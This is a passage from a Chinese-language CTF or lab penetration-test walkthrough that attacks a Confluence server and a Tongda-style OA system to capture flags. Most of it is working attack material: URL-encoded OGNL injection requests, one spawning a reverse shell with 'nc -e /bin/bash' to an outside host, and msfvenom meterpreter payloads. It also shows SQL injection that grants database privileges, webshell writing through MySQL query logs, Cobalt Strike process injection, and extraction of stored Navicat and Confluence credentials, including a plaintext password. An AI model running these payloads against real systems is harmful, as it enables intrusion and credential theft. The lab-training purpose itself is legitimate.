    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 1060
    Origin: http://192.168.10.129:8000
    Connection: close
    Referer: http://192.168.10.129:8000/pages/doenterpagevariables.action
    Cookie: JSESSIONID=67C450235CD839CF8F51DC9E4541FE44
    Upgrade-Insecure-Requests: 1
    queryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022                               id                                                       %5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+process%3d+p.start%28%29%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3b+var+bufferedReader+%3d+new+java.io.BufferedReader%28inputStreamReader%29%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while%28%28line+%3d+bufferedReader.readLine%28%29%29+%21%3d+null%29%7boutput+%3d+output+%2b+line+%2b+java.lang.Character.toString%2810%29%3b+%7d%5cu0027%29%7d%2b%5cu0027
​
这里发现发现机器是centos,在linux上Confluence的默认权限为confluence，没有写权限，所以我们这里没办法直接写webshell了。但是这里可以利用centos上的nc先拿到一共shell进行操作。
上传lcx.exe进行端口转发
    start /min lcx.exe -tran 7777 172.168.1.128 3333
    POST /pages/doenterpagevariables.action HTTP/1.1
    Host: 192.168.10.129:8000
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 1159
    Origin: http://192.168.10.129:8000
    Connection: close
    Referer: http://192.168.10.129:8000/pages/doenterpagevariables.action
    Cookie: JSESSIONID=67C450235CD839CF8F51DC9E4541FE44
    Upgrade-Insecure-Requests: 1
    queryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022                            nc -e /bin/bash 10.1.16.68 7777                                          %5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+process%3d+p.start%28%29%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3b+var+bufferedReader+%3d+new+java.io.BufferedReader%28inputStreamReader%29%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while%28%28line+%3d+bufferedReader.readLine%28%29%29+%21%3d+null%29%7boutput+%3d+output+%2b+line+%2b+java.lang.Character.toString%2810%29%3b+%7d%5cu0027%29%7d%2b%5cu0027
    python -c "import pty;pty.spawn('/bin/bash')"
之后可以再上线msf，先做端口转发:
    start /min lcx.exe -tran 8888 172.168.1.128 1111
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.1.16.68 LPORT=8888 -f elf > test7002.elf
tmp目录是所有用户共有的临时文件夹，所有用户都拥有读写权限，所以可以将elf写到/tmp下执行。
本机的信息收集，查看数据库账号密码:
    cat /var/atlassian/application-data/confluence/confluence.cfg.xml
    2021ISoon!@#
        jdbc:mysql://localhost:3306/confluence?useUnicode=true&amp;characterEncoding=UTF-8&amp;useSSL=false&amp;sessionVariables=tx_isolation='READ-COMMITTED'
        confluenceuser
得到账号密码为
    confluenceuser   2021ISoon!@#
查看用户信息
    select id,user_name,credential from cwd_user;
发现confluence里的密码是加密的，但是我们这里可以重置后台账号密码:
    UPDATE cwd_user SET credential= '{PKCS5S2}UokaJs5wj02LBUJABpGmkxvCX0q+IbTdaUfxy1M9tVOeI38j95MRrVxWjNCu6gsm' WHERE id = 229377;
之后使用isoon2021admin/123456登录后台即可
公告栏获得 flag。
得到oa用户和密码
## 0x03 OA
10.1.16.70
先看看OA的版本11.7:
​ 根据拿到的文档表，使用权限高的用户登录。11.7版本后台getshell方法有好几种: **上传.user.ini** 、
**redis+SSRF组合拳** 、 **后台sql注入添加用户写weshsell** ，这里可以任意选择一种方式拿到webshell。
演示后台sql注入添加用户写weshsell，添加用户:
    http://10.1.16.70/general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql.* TO 'cyzcc'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION
远程连接
    mysql -u cyzcc -p -h 10.1.16.70 -P 3336
然后该用户是对mysql数据库拥有所有权限的,然后给自己加权限：
    UPDATE `mysql`.`user` SET `Password` = '*DE0742FA79F6754E99FDB9C8D2911226A5A9051D', `Select_priv` = 'Y', `Insert_priv` = 'Y', `Update_priv` = 'Y', `Delete_priv` = 'Y', `Create_priv` = 'Y', `Drop_priv` = 'Y', `Reload_priv` = 'Y', `Shutdown_priv` = 'Y', `Process_priv` = 'Y', `File_priv` = 'Y', `Grant_priv` = 'Y', `References_priv` = 'Y', `Index_priv` = 'Y', `Alter_priv` = 'Y', `Show_db_priv` = 'Y', `Super_priv` = 'Y', `Create_tmp_table_priv` = 'Y', `Lock_tables_priv` = 'Y', `Execute_priv` = 'Y', `Repl_slave_priv` = 'Y', `Repl_client_priv` = 'Y', `Create_view_priv` = 'Y', `Show_view_priv` = 'Y', `Create_routine_priv` = 'Y', `Alter_routine_priv` = 'Y', `Create_user_priv` = 'Y', `Event_priv` = 'Y', `Trigger_priv` = 'Y', `Create_tablespace_priv` = 'Y', `ssl_type` = '', `ssl_cipher` = '', `x509_issuer` = '', `x509_subject` = '', `max_questions` = 0, `max_updates` = 0, `max_connections` = 0, `max_user_connections` = 0, `plugin` = 'mysql_native_password', `authentication_string` = '', `password_expired` = 'Y' WHERE `Host` = Cast('%' AS Binary(1)) AND `User` = Cast('cyzcc' AS Binary(5));
然后用注入点刷新权限，因为该用户是没有刷新权限的权限的：`general/hr/manage/query/delete_cascade.php?condition_cascade=flush
privileges;`
提示这个，或者让改密码死活改不了。再执行一下
    grant all privileges ON mysql.* TO 'cyzcc'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION
之后就拥有了所有权限
写马
    # 查路径：
    select @@basedir; # c:\MYOA\mysql5\，那么web目录就是c:\MYOA\webroot    # 方法1：
    set global slow_query_log=on;
    set global slow_query_log_file='C:/MYOA/webroot/cyzcc.php';
    select '' or sleep(11);
    # 方法2：
    set global general_log = on;
    set global general_log_file = 'C:/MYOA/webroot/cyzcc.php';
    select '';
    show variables like '%general%';
上去是system权限，这里本来还想考察一个com组件绕过disable_functions。
上线msf,正向shell：
    msfvenom -p windows/meterpreter/bind_tcp LPORT=1234 -f exe  > bind_shell.exe
将bind_shell.exe上传到oa机器，运行即可收到bind shell
为了方便之后的操作，我们将shell转到CS上操作:
翻一下桌面找到flag:
​ 本机信息收集，在C盘根目录下看到了服务器安装了Navicat,猜测Navicat里可能保存了数据库的账号和密码。
Navicat 中保存的所有连接账密，都是直接存到对应注册表项值下的。
各个数据库连接账密具体存放位置:
    MySQL HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\
    MariaDB HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers\
    Microsoft SQL HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\
    Oracle HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers\
    PostgreSQL HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\
    MongoDB HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMongoDB
    SQLite HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers\
​ 但是我们这里直接在system权限下进行查询是查不到的。尝试查询当前用户的所有连接记录:
​
system进程、服务若要操作用户注册表（HKEY_CURRENT_USER）,如果直接操作注册表会被重定向到HKEY_USERS。所以我们这里需要进行从sys-admin的降权操作。
这里利用Cobalt Strike的进程注入实现降权(msf同理)：
查看具有administrator权限的系统进程
    tasklist /v /fo list
将Payload注入到新进程中去：
    inject 5732 x64
获得一个administrator权限的beacon。
查询mssql的连接账密
    # reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\ /s /v host 数据库连接 ip
    # reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\ /s /v UserName 数据库用户名
    # reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\ /s /v pwd 数据库用户名对应的密码 hash
    # reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\ /s /v Port 数据库连接端口，默认 16 进制数值
之后，我们把拿到的hash复制回来本地解密即可。
其实有一键化的工具可以直接跑：